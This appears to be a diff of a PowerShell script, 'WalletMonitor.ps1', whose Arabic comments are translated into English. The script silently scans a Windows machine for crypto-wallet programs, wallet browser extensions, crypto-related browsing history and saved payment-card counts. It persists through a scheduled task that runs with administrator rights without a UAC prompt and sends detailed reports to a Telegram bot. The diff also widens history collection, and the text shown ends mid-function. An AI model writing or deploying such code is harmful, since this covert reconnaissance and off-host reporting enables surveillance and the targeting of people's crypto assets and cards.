@@ -1,38 +1,38 @@
 #Requires -Version 5.1
 <#
-    WalletMonitor.ps1  ::  v3.0  (ملف واحد مستقل - Single File | بدون Python)
+    WalletMonitor.ps1  ::  v3.0  (Single File | no Python)
     ==================================================================
-    أداة مراقبة آثار محافظ الكريبتو على جهازك (Windows) + إشعارات Telegram.
+    Crypto wallet artifact monitoring tool for your machine (Windows) + Telegram notifications.
 
-    كل شيء داخل هذا الملف الواحد:
-      * الإعدادات (بما فيها توكن البوت و chat_id) مدمجة في الأعلى ($CONFIG).
-      * قوائم الكلمات المفتاحية و الدومينات مدمجة ($WALLETS).
-      * قارئ تاريخ المتصفحات مكتوب بـ PowerShell نقي (بدون Python ولا أي مكتبة خارجية).
-      * تسجيل المهمة المجدولة (Task Scheduler) من نفس الملف عبر -Install.
+    Everything inside this single file:
+      * Config (including the bot token and chat_id) is embedded at the top ($CONFIG).
+      * Keyword and domain lists are embedded ($WALLETS).
+      * The browser-history reader is written in pure PowerShell (no Python, no external library).
+      * Scheduled-task (Task Scheduler) registration from the same file via -Install.
 
-    الفحوصات:
-      1) البرامج المثبتة (الريجستري)            -> محافظ سطح المكتب
-      2) إضافات المتصفحات (Chrome/Edge/.../Firefox)
-      3) تاريخ المتصفحات (قراءة SQLite مباشرة)   -> سحب كل الروابط + تصنيف وترتيب وفلترة
-      4) آثار في نظام الملفات
+    Checks:
+      1) Installed programs (registry)            -> desktop wallets
+      2) Browser extensions (Chrome/Edge/.../Firefox)
+      3) Browser history (direct SQLite read)     -> pull all URLs + classify, sort and filter
+      4) Filesystem artifacts
 
-    التشغيل:
-      .\WalletMonitor.ps1                    # فحص واحد صامت تمامًا + إشعارات Telegram
-      .\WalletMonitor.ps1 -Console           # نفس الفحص مع إظهار المخرجات على الشاشة
-      .\WalletMonitor.ps1 -ScanNow           # فحص فوري (صامت)
-      .\WalletMonitor.ps1 -TestNotify        # تجربة الربط بـ Telegram فقط
-      .\WalletMonitor.ps1 -HistoryReport     # إرسال تقرير تاريخ المتصفح الآن
-      .\WalletMonitor.ps1 -Loop              # حلقة مراقبة مستمرة
-      .\WalletMonitor.ps1 -Install           # تسجيل مهمة مجدولة (Run as Admin)
-      .\WalletMonitor.ps1 -Uninstall         # إزالة المهمة
-      .\WalletMonitor.ps1 -TaskStatus        # حالة المهمة
-      .\WalletMonitor.ps1 -Help              # المساعدة
+    Usage:
+      .\WalletMonitor.ps1                    # One fully silent scan + Telegram notifications
+      .\WalletMonitor.ps1 -Console           # Same scan with the output shown on screen
+      .\WalletMonitor.ps1 -ScanNow           # Immediate scan (silent)
+      .\WalletMonitor.ps1 -TestNotify        # Test the Telegram link only
+      .\WalletMonitor.ps1 -HistoryReport     # Send the browser history report now
+      .\WalletMonitor.ps1 -Loop              # Continuous monitoring loop
+      .\WalletMonitor.ps1 -Install           # Register a scheduled task (Run as Admin)
+      .\WalletMonitor.ps1 -Uninstall         # Remove the task
+      .\WalletMonitor.ps1 -TaskStatus        # Task status
+      .\WalletMonitor.ps1 -Help              # Help
 
-    ملاحظات:
-      - الفحص لا يحتاج صلاحيات Administrator (يقرأ ملفات المستخدم الحالي).
-      - تسجيل/إزالة المهمة فقط يحتاج تشغيل PowerShell كمسؤول.
-      - لا يتم تسجيل التوكن أو أي بيانات حساسة في ملف اللوج.
-      - الوضع الافتراضي صامت: لا يطبع شيئًا على الشاشة، كل شيء في ملف اللوج.
+    Notes:
+      - Scanning does not require Administrator rights (reads the current user's files).
+      - Only registering/removing the task requires running PowerShell as administrator.
+      - The token or any sensitive data is never written to the log file.
+      - Default mode is silent: nothing is printed to the screen, everything goes to the log file.
 #>
 
 [CmdletBinding()]
@@ -60,12 +60,12 @@ try {
         [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11
 } catch { }
 
-# ---- الوضع الصامت: لا مخرجات على الشاشة إلا مع -Console أو أوامر الإدارة ----
+# ---- Silent mode: no screen output except with -Console or admin commands ----
 $Script:ConsoleMode = [bool]($Console -or $Install -or $Uninstall -or $TaskStatus -or $TestNotify -or $HistoryReport -or $CardReport -or $Elevate -or $Help)
 if (-not $Script:ConsoleMode) { $ErrorActionPreference = 'SilentlyContinue' }
 
 # =====================================================================
-#  1)  الإعدادات المدمجة  (عدّل هنا مباشرة - كل شيء في مكان واحد)
+#  1)  Embedded config  (edit here directly - everything in one place)
 # =====================================================================
 
 $CONFIG = @{
@@ -81,7 +81,7 @@ $CONFIG = @{
 
     schedule = @{
         interval_minutes = 30
-        run_level        = 'highest'   # highest = المهمة تعمل بصلاحيات Administrator بصمت (بدون UAC) | limited = صلاحيات المستخدم
+        run_level        = 'highest'   # highest = the task runs with Administrator rights silently (no UAC) | limited = user rights
         daily_summary    = @{ enabled = $true; hour = 21 }
     }
 
@@ -94,16 +94,16 @@ $CONFIG = @{
     }
 
     browser_history = @{
-        lookback_days           = 30
-        max_results_per_browser = 300
+        lookback_days           = 0
+        max_results_per_browser = 2000
         match_title_too         = $true
 
-        # ---- إعدادات تقرير التاريخ (الجديد) ----
+        # ---- History report settings (new) ----
         report = @{
-            mode                     = 'always'          # always = تقرير دوري | new_only = عند وجود جديد فقط
+            mode                     = 'always'          # always = periodic report | new_only = only when there is something new
             min_hours_between_reports = 6
             top_per_category         = 15
-            sort_by                  = 'visits'          # visits = الأكثر زيارة | recent = الأحدث
+            sort_by                  = 'visits'          # visits = most visited | recent = most recent
             include_categories       = @('wallet', 'exchange', 'dapp', 'crypto')
             top_domains              = 10
             recent_items             = 8
@@ -146,20 +146,20 @@ $CONFIG = @{
         profile_root = '%APPDATA%\Mozilla\Firefox\Profiles'
     }
 
-    # ---- بطاقات الدفع المحفوظة في المتصفحات (عدّ فقط — بدون أي استخراج) ----
+    # ---- Saved payment cards in browsers (count-only — no extraction) ----
     credit_cards = @{
         enabled          = $true
-        count_only       = $true      # إلزامي: عدّ فقط، لا يُقرأ أي رقم/اسم بطاقة ولا يُفكّ تشفير
-        notify_on_change = $true      # إشعار Telegram فقط عند تغيّر الأعداد
+        count_only       = $true      # Mandatory: count-only; no card number/name is read and no decryption is performed
+        notify_on_change = $true      # Telegram notification only when the counts change
     }
 
     host_label = ''
 }
 
 # =====================================================================
-#  2)  قوائم الكلمات المفتاحية و الدومينات (مدمجة)
-#     كل قسم مستقل - ضيف سطر هنا والأداة هتلقطه تلقائيًا.
-#     المطابقة بطريقة "احتواء" (substring) وبدون حساسية لحالة الأحرف.
+#  2)  Keyword and domain lists (embedded)
+#     Each section is independent - add a line here and the tool picks it up automatically.
+#     Matching is substring-based and case-insensitive.
 # =====================================================================
 
 $WALLETS = @{
@@ -210,7 +210,7 @@ $WALLETS = @{
         'lido.fi', 'makerdao.com', 'dydx.exchange', 'gmx.io', 'raydium.io'
     )
 
-    # كلمات لتصنيف أي رابط آخر كـ "كريبتو" (تدقيق أوسع من الدومينات المعروفة)
+    # Keywords to classify any other URL as "Crypto" (broader check than the known domains)
     crypto_keywords = @(
         'crypto', 'cryptocurrency', 'blockchain', 'web3', 'defi', 'nft',
         'airdrop', 'bitcoin', 'ethereum', 'solana', 'binance', 'coinbase',
@@ -237,7 +237,7 @@ $WALLETS = @{
 }
 
 # =====================================================================
-#  3)  المسارات الأساسية
+#  3)  Base paths
 # =====================================================================
 
 $Script:ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
@@ -269,12 +269,12 @@ $Script:HistoryBrowsers = 0
 $Script:CardStats = @()
 
 # =====================================================================
-#  4)  أدوات مساعدة عامة
+#  4)  General helper functions
 # =====================================================================
 
 function Get-Prop {
-    # ملاحظة مهمة: PowerShell "تفرُد" المصفوفات عند إرجاعها من الدوال، لذا أي استدعاء
-    # يتوقع مصفوفة يجب أن يُغلَّف بـ @(...)  ->  @(Get-Prop ...)
+    # Important note: PowerShell "unrolls" arrays when they are returned from functions, so any call
+    # that expects an array must be wrapped with @(...)  ->  @(Get-Prop ...)
     param($Object, [string]$Name, $Default = $null)
     if ($null -eq $Object) { return $Default }
     if ($Object -is [System.Collections.IDictionary]) {
@@ -296,7 +296,7 @@ function Set-CfgValue {
 }
 
 function Merge-Config {
-    <# دمج ملف JSON خارجي فوق الإعدادات المدمجة (اختياري عبر -ConfigPath) #>
+    <# Merge an external JSON file over the embedded config (optional via -ConfigPath) #>
     param($Base, $Over)
     if ($null -eq $Over) { return }
     if ($Over -is [System.Collections.IDictionary]) {
@@ -321,9 +321,9 @@ function Merge-Config {
 
 function Read-JsonFile {
     param([string]$Path)
-    if (-not (Test-Path -LiteralPath $Path)) { throw "الملف غير موجود: $Path" }
+    if (-not (Test-Path -LiteralPath $Path)) { throw "File not found: $Path" }
     $raw = [System.IO.File]::ReadAllText($Path, [System.Text.Encoding]::UTF8)
-    if ([string]::IsNullOrWhiteSpace($raw)) { throw "الملف فارغ: $Path" }
+    if ([string]::IsNullOrWhiteSpace($raw)) { throw "File is empty: $Path" }
     return ($raw | ConvertFrom-Json)
 }
 
@@ -383,7 +383,7 @@ function Get-MatchedKeyword {
 }
 
 # =====================================================================
-#  5)  اللوج
+#  5)  Logging
 # =====================================================================
 
 function Initialize-Log {
@@ -410,7 +410,7 @@ function Rotate-LogIfNeeded {
 }
 
 function Write-Console {
-    <# كتابة على الشاشة فقط في وضع الكونسول (أو أوامر الإدارة). #>
+    <# Write to the screen only in console mode (or admin commands). #>
     param([string]$Message, [string]$Color = '')
     if (-not $Script:ConsoleMode) { return }
     if ($Color) { Write-Host $Message -ForegroundColor $Color } else { Write-Host $Message }
@@ -420,7 +420,7 @@ function Write-Log {
     param([string]$Message, [ValidateSet('INFO', 'WARN', 'ERROR', 'DEBUG')][string]$Level = 'INFO')
     $ts = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
     $line = "[$ts] [$Level] $Message"
-    # الوضع الصامت: لا شيء على الشاشة إلا في وضع الكونسول
+    # Silent mode: nothing on screen except in console mode
     if ($Script:ConsoleMode) {
         switch ($Level) {
             'ERROR' { Write-Host $line -ForegroundColor Red }
@@ -444,7 +444,7 @@ function Initialize-Telegram {
     $Script:BotToken = [string](Get-Prop $tg 'bot_token' '')
     $Script:ChatId   = [string](Get-Prop $tg 'chat_id' '')
 
-    # متغيرات البيئة لها الأولوية (أفضل أمنيًا من تخزين التوكن في الملف)
+    # Environment variables take priority (safer than storing the token in the file)
     if ($env:WALLETMON_BOT_TOKEN) { $Script:BotToken = $env:WALLETMON_BOT_TOKEN }
     if ($env:WALLETMON_CHAT_ID)   { $Script:ChatId   = $env:WALLETMON_CHAT_ID }
 
@@ -453,17 +453,17 @@ function Initialize-Telegram {
     $Script:NotifyOnError  = [bool](Get-Prop $tg 'notify_on_error' $true)
 
     if ([string]::IsNullOrWhiteSpace($Script:BotToken) -or $Script:BotToken -like 'PUT_YOUR*') {
-        Write-Log 'لم يتم ضبط bot_token (config مدمج أو WALLETMON_BOT_TOKEN). الإشعارات معطّلة.' 'WARN'
+        Write-Log 'bot_token is not set (embedded config or WALLETMON_BOT_TOKEN). Notifications are disabled.' 'WARN'
         $Script:BotToken = ''
     }
     if ([string]::IsNullOrWhiteSpace($Script:ChatId) -or $Script:ChatId -like 'PUT_YOUR*') {
-        Write-Log 'لم يتم ضبط chat_id (config مدمج أو WALLETMON_CHAT_ID). الإشعارات معطّلة.' 'WARN'
+        Write-Log 'chat_id is not set (embedded config or WALLETMON_CHAT_ID). Notifications are disabled.' 'WARN'
         $Script:ChatId = ''
     }
 }
 
 function Send-TelegramMessage {
-    <# إرسال رسالة واحدة. يرجّع $true/$false. لا يسجّل التوكن في اللوج. #>
+    <# Sends a single message. Returns $true/$false. Does not log the token. #>
     param(
         [Parameter(Mandatory = $true)][string]$Text,
         [switch]$Force
@@ -488,7 +488,7 @@ function Send-TelegramMessage {
                 if ($Script:RateLimitMs -gt 0) { Start-Sleep -Milliseconds $Script:RateLimitMs }
                 return $true
             }
-            Write-Log "Telegram رفض الرسالة: $($resp.description)" 'ERROR'
+            Write-Log "Telegram rejected the message: $($resp.description)" 'ERROR'
             return $false
         }
         catch {
@@ -497,7 +497,7 @@ function Send-TelegramMessage {
                 Start-Sleep -Seconds (2 * $attempt)
                 continue
             }
-            Write-Log "فشل إرسال إشعار Telegram بعد 3 محاولات: $msg" 'ERROR'
+            Write-Log "Failed to send Telegram notification after 3 attempts: $msg" 'ERROR'
             return $false
         }
     }
@@ -505,7 +505,7 @@ function Send-TelegramMessage {
 }
 
 # =====================================================================
-#  7)  الحالة (منع تكرار الإشعارات)
+#  7)  State (prevents duplicate notifications)
 # =====================================================================
 
 function Initialize-State {
@@ -528,7 +528,7 @@ function Initialize-State {
             $loaded = Read-JsonFile $Script:StateFile
             if ($loaded) { $Script:State = $loaded }
         } catch {
-            Write-Log "تعذّر قراءة state.json، سيتم إنشاء ملف جديد: $($_.Exception.Message)" 'WARN'
+            Write-Log "Could not read state.json; a new file will be created: $($_.Exception.Message)" 'WARN'
         }
     }
 
@@ -539,7 +539,7 @@ function Initialize-State {
     foreach ($s in @($Script:State.seen)) {
         if ($null -ne $s -and $s.key) { [void]$Script:SeenSet.Add([string]$s.key) }
     }
-    Write-Log "عدد العناصر المحفوظة في الحالة: $($Script:SeenSet.Count)"
+    Write-Log "Items stored in state: $($Script:SeenSet.Count)"
 }
 
 function Save-State {
@@ -555,14 +555,14 @@ function Save-State {
         $Script:State.last_run = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
         Write-JsonFile -Path $Script:StateFile -Object $Script:State
     } catch {
-        Write-Log "تعذّر حفظ state.json: $($_.Exception.Message)" 'ERROR'
+        Write-Log "Could not save state.json: $($_.Exception.Message)" 'ERROR'
     }
 }
 
 function Register-Finding {
     <#
-        يسجّل نتيجة. يرجّع $true لو دي أول مرة نشوفها.
-        -Silent: يسجّل في الحالة (لمنع التكرار) لكن لا يضيفها لقائمة الإرسال الفوري.
+        Records a result. Returns $true if this is the first time we see it.
+        -Silent: records into state (to prevent duplicates) but does not add it to the immediate-send list.
     #>
     param(
         [ValidateSet('desktop', 'extension', 'history', 'file', 'card')][string]$Type,
@@ -605,9 +605,9 @@ function Add-DailyCounter {
 }
 
 # =====================================================================
-#  8)  قارئ SQLite مكتوب بـ PowerShell نقي (بدون Python / بدون أي DLL)
-#      يقرأ جداول B-Tree مباشرة من ملفات المتصفحات (urls / moz_places)
-#      مع إعادة تجميع صفحات الـ overflow. للقراءة فقط ولا يعدّل أي ملف.
+#  8)  Pure-PowerShell SQLite reader (no Python / no DLL)
+#      Reads B-Tree tables directly from browser files (urls / moz_places)
+#      With overflow-page reassembly. Read-only; it modifies no file.
 # =====================================================================
 
 function Read-BE {
@@ -678,7 +678,7 @@ function Read-SqliteRecord {
 }
 
 function Read-PayloadLocal {
-    # يرجّع byte[] بطول X بعد إعادة تجميع سلسلة صفحات الـ overflow.
+    # Returns a byte[] of length X after reassembling the overflow-page chain.
     param([byte[]]$B, [int]$Start, [long]$X, [int]$PageSize, [int]$Usable, [int]$TotalPages)
     $maxLocal = $Usable - 35
     $minLocal = [int][math]::Floor(((($Usable - 12) * 32) / 255)) - 23
@@ -751,7 +751,7 @@ function Walk-TableBtree {
 }
 
 function Get-SqliteColumnsFromSql {
-    <# يستخرج أسماء الأعمدة من جملة CREATE TABLE المخزّنة في sqlite_master. #>
+    <# Extracts column names from the CREATE TABLE statement stored in sqlite_master. #>
     param([string]$Sql)
     $cols = New-Object System.Collections.Generic.List[string]
     if ([string]::IsNullOrWhiteSpace($Sql)) { return @($cols.ToArray()) }
@@ -779,10 +779,10 @@ function Get-SqliteColumnsFromSql {
 }
 
 function Get-SqliteInfo {
-    <# يحلّل هيدر الملف + sqlite_master ويرجّع بيانات الجدول (بدون فكّ أي صف). #>
+    <# Parses the file header + sqlite_master and returns the table data (without decoding any row). #>
     param([string]$Path, [string]$Table)
     $B = [System.IO.File]::ReadAllBytes($Path)
-    if ($B.Length -lt 100 -or $B[0] -ne 0x53 -or $B[1] -ne 0x51) { throw "ليس ملف SQLite صالح: $Path" }
+    if ($B.Length -lt 100 -or $B[0] -ne 0x53 -or $B[1] -ne 0x51) { throw "Not a valid SQLite file: $Path" }
     $pageSize = [int](Read-BE $B 16 2)
     if ($pageSize -eq 1) { $pageSize = 65536 }
     $reserved = [int]$B[20]
@@ -822,7 +822,7 @@ function Get-SqliteTableData {
 }
 
 function Get-SqliteLeafRefs {
-    <# يجمع مواقع/حجوم الـ payload في الصفحات الورقية فقط (بدون فكّ أي قيمة). #>
+    <# Collects payload offsets/sizes in leaf pages only (without decoding any value). #>
     param([byte[]]$B, [int]$PageNum, [int]$PageSize, [int]$Usable, [int]$TotalPages,
         [System.Collections.Generic.List[object]]$Refs, [int]$Depth = 0)
     if ($PageNum -le 0 -or $PageNum -gt $TotalPages -or $Depth -gt 64) { return }
@@ -849,7 +849,7 @@ function Get-SqliteLeafRefs {
 }
 
 function Get-SqliteRowCount {
-    <# يعدّ صفوف الجدول بعدّ خلايا الصفحات الورقية فقط — بدون قراءة أي payload. #>
+    <# Counts table rows by counting leaf-page cells only — without reading any payload. #>
     param([byte[]]$B, [int]$PageNum, [int]$PageSize, [int]$Usable, [int]$TotalPages, [int]$Depth = 0)
     if ($PageNum -le 0 -or $PageNum -gt $TotalPages -or $Depth -gt 64) { return 0 }
     $info = Get-SqlitePageInfo $B $PageNum $PageSize $Usable
@@ -868,7 +868,7 @@ function Get-SqliteRowCount {
 }
 
 function Get-SqliteColumnValues {
-    <# يقرأ عمودًا نصيًا واحدًا فقط بالاسم؛ باقي الأعمدة تُتخطّى بايت-بايت بدون فكّ أو نسخ. #>
+    <# Reads a single text column by name; the other columns are skipped byte-by-byte without decoding or copying. #>
     param([string]$Path, [string]$Table, [string]$Column)
     $out = New-Object System.Collections.Generic.List[string]
     $info = Get-SqliteInfo -Path $Path -Table $Table
@@ -905,7 +905,7 @@ function Get-SqliteColumnValues {
             elseif ($tp -eq 5) { $sz = 6 }
             elseif ($tp -eq 6 -or $tp -eq 7) { $sz = 8 }
             if ($k -eq $idx) {
-                # نستخرج العمود المطلوب فقط (نصي) ولا نلمس أي عمود آخر.
+                # We extract only the requested (text) column and touch no other column.
                 if ($tp -ge 13 -and ($tp % 2) -eq 1 -and $sz -gt 0) { $found = $info.Enc.GetString($payload, $body, $sz) }
                 break
             }
@@ -919,7 +919,7 @@ function Get-SqliteColumnValues {
 }
 
 function Copy-LockedFile {
-    <# نسخ ملف قيد الاستخدام (متصفح مفتوح) عبر مشاركة القراءة - بدون تعديل المصدر. #>
+    <# Copies a file in use (open browser) via read sharing - without modifying the source. #>
     param([string]$Source, [string]$Dest)
     $fs = [System.IO.File]::Open($Source, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
     try {
@@ -929,7 +929,7 @@ function Copy-LockedFile {
 }
 
 function ConvertFrom-WebkitTime {
-    <# ميكروثانية منذ 1601-01-01 (Chrome / Edge / Brave / Vivaldi / Opera / Chromium). #>
+    <# Microseconds since 1601-01-01 (Chrome / Edge / Brave / Vivaldi / Opera / Chromium). #>
     param([long]$Micros)
     if ($Micros -le 0) { return $null }
     try {
@@ -939,7 +939,7 @@ function ConvertFrom-WebkitTime {
 }
 
 function ConvertFrom-UnixMicros {
-    <# ميكروثانية منذ 1970-01-01 (Firefox moz_places.last_visit_date). #>
+    <# Microseconds since 1970-01-01 (Firefox moz_places.last_visit_date). #>
     param([long]$Micros)
     if ($Micros -le 0) { return $null }
     try {
@@ -950,14 +950,14 @@ function ConvertFrom-UnixMicros {
 
 
 # =====================================================================
-#  9)  فحص 1: البرامج المثبتة (الريجستري) -> محافظ سطح المكتب
+#  9)  Check 1: installed programs (registry) -> desktop wallets
 # =====================================================================
 
 function Invoke-InstalledProgramScan {
-    Write-Log 'فحص البرامج المثبتة (الريجستري)...'
+    Write-Log 'Scanning installed programs (registry)...'
 
     $keywords = @(Get-Prop $Script:Wallets 'desktop_wallets' @())
-    if ($keywords.Count -eq 0) { Write-Log 'قائمة desktop_wallets فارغة.' 'WARN'; return }
+    if ($keywords.Count -eq 0) { Write-Log 'desktop_wallets list is empty.' 'WARN'; return }
 
     $paths = @(
         'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
@@ -968,7 +968,7 @@ function Invoke-InstalledProgramScan {
     $scanned = 0
     foreach ($p in $paths) {
         try { $items = @(Get-ItemProperty -Path $p -ErrorAction Stop) }
-        catch { Add-Error "تعذّر قراءة مسار الريجستري '$p': $($_.Exception.Message)"; continue }
+        catch { Add-Error "Could not read registry path '$p': $($_.Exception.Message)"; continue }
 
         foreach ($it in $items) {
             $scanned++
@@ -986,28 +986,28 @@ function Invoke-InstalledProgramScan {
             if ($date -match '^(\d{4})(\d{2})(\d{2})$') { $date = "$($Matches[1])-$($Matches[2])-$($Matches[3])" }
 
             $msg = @()
-            $msg += '🔴 <b>اكتشاف جديد: محفظة سطح مكتب</b>'
+            $msg += '🔴 <b>New detection: desktop wallet</b>'
             $msg += '━━━━━━━━━━━━━━━━'
-            $msg += "📛 الاسم: <code>$(ConvertTo-HtmlSafe (Limit-Text $dn 90))</code>"
-            $msg += "📦 الإصدار: $(ConvertTo-HtmlSafe (Limit-Text $ver 40))"
-            $msg += "📅 تاريخ التثبيت: $(ConvertTo-HtmlSafe (Limit-Text $date 30))"
-            if ($loc) { $msg += "📁 المسار: <code>$(ConvertTo-HtmlSafe (Limit-Text $loc 160))</code>" }
-            if ($pub) { $msg += "🏢 الناشر: $(ConvertTo-HtmlSafe (Limit-Text $pub 80))" }
-            $msg += "🔎 الكلمة المفتاحية: <code>$(ConvertTo-HtmlSafe $kw)</code>"
-            $msg += "🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
-            $msg += "🕒 وقت الاكتشاف: $((Get-Date).ToString('yyyy-MM-dd HH:mm'))"
+            $msg += "📛 Name: <code>$(ConvertTo-HtmlSafe (Limit-Text $dn 90))</code>"
+            $msg += "📦 Version: $(ConvertTo-HtmlSafe (Limit-Text $ver 40))"
+            $msg += "📅 Install date: $(ConvertTo-HtmlSafe (Limit-Text $date 30))"
+            if ($loc) { $msg += "📁 Path: <code>$(ConvertTo-HtmlSafe (Limit-Text $loc 160))</code>" }
+            if ($pub) { $msg += "🏢 Publisher: $(ConvertTo-HtmlSafe (Limit-Text $pub 80))" }
+            $msg += "🔎 Keyword: <code>$(ConvertTo-HtmlSafe $kw)</code>"
+            $msg += "🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
+            $msg += "🕒 Discovered: $((Get-Date).ToString('yyyy-MM-dd HH:mm'))"
 
             $key = "registry|$dn|$ver|$loc"
             $isNew = Register-Finding -Type 'desktop' -Key $key -Label $dn -Message ($msg -join "`n")
             if ($isNew) { Add-DailyCounter -Type 'desktop' }
-            Write-Log "محفظة سطح مكتب: $dn $ver" 'INFO'
+            Write-Log "Desktop wallet: $dn $ver" 'INFO'
         }
     }
-    Write-Log "تم فحص $scanned سجل برنامج مثبّت."
+    Write-Log "Scanned $scanned installed-program registry entries."
 }
 
 # =====================================================================
-#  10)  فحص 2: إضافات المتصفحات
+#  10)  Check 2: browser extensions
 # =====================================================================
 
 function Resolve-ExtensionMessage {
@@ -1045,10 +1045,10 @@ function Get-ChromiumPreferencesExtensions {
         if (-not (Test-Path -LiteralPath $p)) { continue }
         try {
             $fi = Get-Item -LiteralPath $p -ErrorAction Stop
-            if ($fi.Length -gt 40MB) { Write-Log "تخطّي $fileName (حجم كبير جدًا: $([int]($fi.Length/1MB))MB)" 'DEBUG'; continue }
+            if ($fi.Length -gt 40MB) { Write-Log "Skipping $fileName (file too large: $([int]($fi.Length/1MB))MB)" 'DEBUG'; continue }
             $j = Read-JsonFile $p
         } catch {
-            Add-Error "تعذّر قراءة $fileName في $ProfileDir : $($_.Exception.Message)"
+            Add-Error "Could not read $fileName in $ProfileDir : $($_.Exception.Message)"
             continue
         }
 
@@ -1140,24 +1140,24 @@ function New-ExtensionMessage {
         [string]$ExtId, [string]$State, [string]$Permissions, [string]$Description, [string]$Source
     )
     $msg = @()
-    $msg += '🟠 <b>اكتشاف جديد: إضافة محفظة في المتصفح</b>'
+    $msg += '🟠 <b>New detection: browser wallet extension</b>'
     $msg += '━━━━━━━━━━━━━━━━'
-    $msg += "🧩 الإضافة: <b>$(ConvertTo-HtmlSafe (Limit-Text $Name 90))</b>"
-    $msg += "📦 الإصدار: $(ConvertTo-HtmlSafe (Limit-Text $Version 30))"
-    $msg += "🌐 المتصفح: $(ConvertTo-HtmlSafe $Browser)"
-    $msg += "👤 البروفايل: <code>$(ConvertTo-HtmlSafe $Profile)</code>"
-    if ($ExtId) { $msg += "🆔 المعرّف: <code>$(ConvertTo-HtmlSafe (Limit-Text $ExtId 120))</code>" }
-    $msg += "📌 الحالة: $(ConvertTo-HtmlSafe $State)"
-    if ($Source) { $msg += "📎 المصدر: $(ConvertTo-HtmlSafe $Source)" }
-    if ($Permissions) { $msg += "🔑 الصلاحيات: <code>$(ConvertTo-HtmlSafe (Limit-Text $Permissions 350))</code>" }
-    if ($Description) { $msg += "📝 الوصف: $(ConvertTo-HtmlSafe (Limit-Text $Description 150))" }
-    $msg += "🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
-    $msg += "🕒 وقت الاكتشاف: $((Get-Date).ToString('yyyy-MM-dd HH:mm'))"
+    $msg += "🧩 Extension: <b>$(ConvertTo-HtmlSafe (Limit-Text $Name 90))</b>"
+    $msg += "📦 Version: $(ConvertTo-HtmlSafe (Limit-Text $Version 30))"
+    $msg += "🌐 Browser: $(ConvertTo-HtmlSafe $Browser)"
+    $msg += "👤 Profile: <code>$(ConvertTo-HtmlSafe $Profile)</code>"
+    if ($ExtId) { $msg += "🆔 ID: <code>$(ConvertTo-HtmlSafe (Limit-Text $ExtId 120))</code>" }
+    $msg += "📌 Status: $(ConvertTo-HtmlSafe $State)"
+    if ($Source) { $msg += "📎 Source: $(ConvertTo-HtmlSafe $Source)" }
+    if ($Permissions) { $msg += "🔑 Permissions: <code>$(ConvertTo-HtmlSafe (Limit-Text $Permissions 350))</code>" }
+    if ($Description) { $msg += "📝 Description: $(ConvertTo-HtmlSafe (Limit-Text $Description 150))" }
+    $msg += "🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
+    $msg += "🕒 Discovered: $((Get-Date).ToString('yyyy-MM-dd HH:mm'))"
     return ($msg -join "`n")
 }
 
 function Invoke-BrowserExtensionScan {
-    Write-Log 'فحص إضافات المتصفحات...'
+    Write-Log 'Scanning browser extensions...'
 
     $extKeywords = @(Get-Prop $Script:Wallets 'browser_extensions' @())
     $totalExt = 0
@@ -1171,11 +1171,11 @@ function Invoke-BrowserExtensionScan {
         foreach ($prof in (Get-ChromiumProfiles -UserDataDir $userData)) {
             $diskExts = @()
             try { $diskExts = @(Get-ChromiumDiskExtensions -ProfileDir $prof.FullName -ProfileName $prof.Name -BrowserName $browserName) }
-            catch { Add-Error "فشل فحص إضافات $browserName/$($prof.Name): $($_.Exception.Message)" }
+            catch { Add-Error "Failed to scan extensions for $browserName/$($prof.Name): $($_.Exception.Message)" }
 
             $prefExts = @{}
             try { $prefExts = Get-ChromiumPreferencesExtensions -ProfileDir $prof.FullName }
-            catch { Add-Error "فشل قراءة Preferences لـ $browserName/$($prof.Name): $($_.Exception.Message)" }
+            catch { Add-Error "Failed to read Preferences for $browserName/$($prof.Name): $($_.Exception.Message)" }
 
             $seenIds = New-Object 'System.Collections.Generic.HashSet[string]'
 
@@ -1185,15 +1185,15 @@ function Invoke-BrowserExtensionScan {
 
                 $name = $e.Name
                 $ver  = $e.Version
-                $stateTxt = 'مُفعّلة (على القرص)'
+                $stateTxt = 'Enabled (on disk)'
                 if ($prefExts.ContainsKey($e.Id)) {
                     $pe = $prefExts[$e.Id]
                     if ($name -like '__MSG_*' -or [string]::IsNullOrWhiteSpace($name)) { if ($pe.name) { $name = $pe.name } }
                     if (-not $ver -and $pe.version) { $ver = $pe.version }
                     $stateTxt = switch ($pe.state) {
-                        '0' { 'مُفعّلة' }
-                        '1' { 'مُعطّلة' }
-                        '2' { 'مُعطّلة من المستخدم' }
+                        '0' { 'Enabled' }
+                        '1' { 'Disabled' }
+                        '2' { 'Disabled by user' }
                         default { "state=$($pe.state)" }
                     }
                 }
@@ -1209,7 +1209,7 @@ function Invoke-BrowserExtensionScan {
                 $key = "chromium-ext|$browserName|$($e.Profile)|$($e.Id)"
                 $isNew = Register-Finding -Type 'extension' -Key $key -Label "$name ($browserName/$($e.Profile))" -Message $msg
                 if ($isNew) { Add-DailyCounter -Type 'extension' }
-                Write-Log "إضافة محفظة: $name [$browserName/$($e.Profile)] $ver" 'INFO'
+                Write-Log "Wallet extension: $name [$browserName/$($e.Profile)] $ver" 'INFO'
             }
 
             foreach ($id in $prefExts.Keys) {
@@ -1219,7 +1219,7 @@ function Invoke-BrowserExtensionScan {
                 if (-not $kw) { continue }
 
                 $msg = New-ExtensionMessage -Name $pe.name -Version $pe.version -Browser $browserName -Profile $prof.Name `
-                    -ExtId $id -State 'غير موجودة على القرص' -Permissions '' -Description '' -Source "$($pe.from)"
+                    -ExtId $id -State 'Not present on disk' -Permissions '' -Description '' -Source "$($pe.from)"
                 $key = "chromium-ext|$browserName|$($prof.Name)|$id"
                 $isNew = Register-Finding -Type 'extension' -Key $key -Label "$($pe.name) ($browserName/$($prof.Name))" -Message $msg
                 if ($isNew) { Add-DailyCounter -Type 'extension' }
@@ -1237,7 +1237,7 @@ function Invoke-BrowserExtensionScan {
                 if (-not (Test-Path -LiteralPath $extJson)) { continue }
 
                 try { $j = Read-JsonFile $extJson }
